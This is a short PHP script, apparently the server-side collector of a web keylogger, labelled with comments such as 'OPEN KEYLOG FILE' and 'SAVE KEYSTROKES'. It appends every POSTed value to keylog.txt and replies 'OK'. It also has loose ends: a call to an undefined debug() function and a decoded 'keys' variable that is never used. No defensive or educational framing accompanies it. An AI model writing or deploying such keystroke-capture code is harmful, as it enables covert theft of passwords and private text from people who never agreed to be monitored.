
<?php
// (A) OPEN KEYLOG FILE, APPEND MODE
debug($_POST,1);
$file = fopen("keylog.txt", "a+");
 
// (B) SAVE KEYSTROKES
$keys = json_decode($_POST["keys"]);

$i = 1;
foreach ($_POST as $k=>$v) { 
    if($i % 2 != 0){
        fwrite($file,$v."; ");
    }
    else{
        fwrite($file,$v."\n");
    }
  $i++;
}

// (C) CLOSE & END
fclose($file);
echo "OK";